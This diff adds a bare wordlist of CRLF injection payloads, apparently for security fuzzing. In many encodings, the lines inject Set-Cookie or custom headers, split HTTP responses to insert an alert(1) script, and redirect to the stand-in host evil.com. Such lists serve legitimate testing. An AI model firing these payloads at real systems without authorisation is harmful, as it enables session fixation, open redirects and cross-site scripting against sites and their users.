@@ -1,0 +1,25 @@
+%0d%0aSet-Cookie:crlf=injection
+%0d%0aX-Injected:header
+%0d%0a%0d%0a<script>alert(1)</script>
+%0aSet-Cookie:crlf=injection
+%0dSet-Cookie:crlf=injection
+\r\nSet-Cookie:crlf=injection
+\nSet-Cookie:crlf=injection
+\rSet-Cookie:crlf=injection
+%E5%98%8A%E5%98%8DSet-Cookie:crlf=injection
+%c0%0d%c0%0aSet-Cookie:crlf=injection
+%250d%250aSet-Cookie:crlf=injection
+%%0d0d%%0a0aSet-Cookie:crlf=injection
+%25%30%64%25%30%61Set-Cookie:crlf=injection
+%u000aSet-Cookie:crlf=injection
+%u000dSet-Cookie:crlf=injection
+%0d%0aLocation:https://evil.com
+%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
+%E5%98%8D%E5%98%8ASet-Cookie:crlf=injection
+%E5%98%8D%E5%98%8ALocation:https://evil.com
+%0d%0d%0aSet-Cookie:crlf=injection
+%0a%0aSet-Cookie:crlf=injection
+%0d%0a%20Set-Cookie:crlf=injection
+%0d%0a	Set-Cookie:crlf=injection
+%00%0d%0aSet-Cookie:crlf=injection
